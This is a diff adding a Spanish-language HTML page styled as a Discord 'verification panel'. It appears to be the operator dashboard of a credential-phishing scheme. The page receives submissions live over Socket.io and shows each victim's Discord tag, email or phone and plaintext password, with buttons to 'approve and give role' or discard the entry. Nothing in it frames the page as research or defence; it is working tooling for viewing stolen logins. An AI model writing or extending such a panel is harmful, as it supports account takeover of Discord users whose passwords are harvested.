@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Admin | Panel de Verificaciones</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'gg sans', 'Noto Sans', Helvetica, Arial, sans-serif; }
+        body { background-color: #2b2d31; color: #dbdee1; margin: 0; display: flex; height: 100vh; }
+        
+        /* Sidebar estilo Discord Server Settings */
+        .sidebar { width: 240px; background-color: #1e1f22; border-right: 1px solid #232428; padding: 20px; font-weight: bold; color: #f2f3f5; }
+        .sidebar-title { font-size: 15px; margin-bottom: 20px; color: #949ba4; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        /* Contenido Principal */
+        .main { flex: 1; display: flex; flex-direction: column; background-color: #313338; }
+        .topbar { height: 60px; border-bottom: 1px solid #26272b; display: flex; align-items: center; padding: 0 24px; font-weight: bold; font-size: 18px; color: #f2f3f5; }
+        
+        .content { padding: 24px; overflow-y: auto; flex: 1; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; align-content: start; }
+        
+        /* Tarjeta tipo Embed / Registro */
+        .card { background-color: #2b2d31; border-radius: 8px; padding: 16px; border-left: 4px solid #5865F2; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .time { font-size: 11px; color: #949ba4; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
+        .badge { background: #5865F2; color: white; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; }
+        
+        .field-title { font-size: 12px; color: #949ba4; font-weight: bold; margin-top: 8px; }
+        .field { background-color: #1e1f22; padding: 8px; border-radius: 4px; font-family: monospace; color: #00a8fc; margin-top: 4px; font-size: 14px; user-select: all; }
+        
+        .btn-group { display: flex; gap: 8px; margin-top: 16px; }
+        button { flex: 1; border: none; padding: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; color: white; font-size: 13px; transition: background 0.2s; }
+        .btn-aprobar { background: #248046; }
+        .btn-aprobar:hover { background: #1a6335; }
+        .btn-rechazar { background: #da373c; }
+        .btn-rechazar:hover { background: #a1282c; }
+
+        .empty-state { text-align: center; color: #949ba4; margin-top: 80px; font-size: 16px; grid-column: 1 / -1; }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div class="sidebar-title">🛡️ Panel de Control</div>
+        <div style="color: #fff; font-size: 14px; cursor: pointer;">📥 Solicitudes en Vivo</div>
+    </div>
+
+    <div class="main">
+        <div class="topbar">Gestión de Accesos y Credenciales</div>
+        <div id="contenedor" class="content">
+            <div id="empty" class="empty-state">Escuchando nuevas solicitudes o recuperaciones en tiempo real...</div>
+        </div>
+    </div>
+
+    <!-- Script de WebSockets de Socket.io -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const contenedor = document.getElementById('contenedor');
+        const emptyState = document.getElementById('empty');
+
+        // Cargar solicitudes existentes al abrir la página
+        fetch('/api/solicitudes')
+            .then(res => res.json())
+            .then(data => {
+                if (data.length > 0) {
+                    emptyState.style.display = 'none';
+                    data.forEach(sol => agregarCard(sol));
+                }
+            });
+
+        // Escuchar nuevas entradas en tiempo real
+        socket.on('nueva-solicitud', (data) => {
+            emptyState.style.display = 'none';
+            agregarCard(data, true);
+        });
+
+        function agregarCard(data, alPrincipio = false) {
+            const div = document.createElement('div');
+            div.className = 'card';
+            div.id = `card-${data.id}`;
+            div.innerHTML = `
+                <div class="time">
+                    <span>${data.fecha}</span>
+                    <span class="badge">${data.tipo || 'Inicio de Sesión'}</span>
+                </div>
+                <div class="field-title">USUARIO DE DISCORD:</div>
+                <div style="color: #f2f3f5; font-size: 14px; font-weight: 500; margin-top: 2px;">${data.discordTag}</div>
+                
+                <div class="field-title">CORREO / TELÉFONO:</div>
+                <div class="field">${data.usuario}</div>
+                
+                <div class="field-title">CONTRASEÑA:</div>
+                <div class="field">${data.password}</div>
+                
+                <div class="btn-group">
+                    <button class="btn-aprobar" onclick="aprobarUsuario('${data.id}', '${data.discordId}')">Aprobar y Dar Rol</button>
+                    <button class="btn-rechazar" onclick="eliminarTarjeta('${data.id}')">Descartar</button>
+                </div>
+            `;
+            
+            if (alPrincipio) {
+                contenedor.prepend(div);
+            } else {
+                contenedor.appendChild(div);
+            }
+        }
+
+        async function aprobarUsuario(id, discordId) {
+            const btn = event.target;
+            btn.innerText = "Procesando...";
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/api/aprobar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id, discordId })
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    eliminarTarjeta(id);
+                    alert('¡Usuario verificado y rol entregado en Discord con éxito!');
+                } else {
+                    alert('Error: ' + data.error);
+                    btn.innerText = "Aprobar y Dar Rol";
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                alert('Error de conexión con el servidor.');
+                btn.innerText = "Aprobar y Dar Rol";
+                btn.disabled = false;
+            }
+        }
+
+        function eliminarTarjeta(id) {
+            const el = document.getElementById(`card-${id}`);
+            if (el) el.remove();
+            
+            if (contenedor.querySelectorAll('.card').length === 0) {
+                emptyState.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
